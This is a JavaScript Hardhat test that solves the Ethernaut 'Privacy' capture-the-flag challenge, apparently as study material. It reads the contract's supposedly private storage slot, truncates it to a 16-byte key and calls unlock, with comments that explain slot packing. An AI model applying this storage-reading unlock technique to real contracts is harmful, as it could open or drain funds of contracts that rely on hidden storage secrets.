const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS12 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Privacy`)
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Privacy'", async () => {
    /*Like in Vault contract we have to read value of variable
    from the storage. We have to remember that compiler
    want to save the space, so flattening, denomination and
    awkwardness will be write in one slot, because sum of their 
    lenght is equal 32 bytes so it is exacly the volume of
    one slot. Value from array will on slots number:
    3,4 and 5. We need value of data[2], so the value of the
    last element. Therefore, we look on the slot number 5 */
    let password = await provider.getStorageAt(challenge.address, 5)
    
    /*Now we have the 32 bytes password, but we need 16 bytes.
    Solidity when convert bigger number of bytes to smaller,
    discards the right-most bytes 
    https://betterprogramming.pub/solidity-tutorial-all-about-conversion-661130eb8bec 
    So we need the first 16 bytes.
    Every bytes is represent by two digits (this digits is hexadecimals),
    it ask why we multiply 16 by 2. Additionally we need 
    the first two signs (0x) because they represent that
    the number is hexadecimals.*/
    password = password.substring(0, 16 * 2 + 2)

    tx = await challenge.unlock(password)
    await tx.wait(1)

    let locked = await challenge.locked()
    assert(locked == false, "You didn't open it!")
})
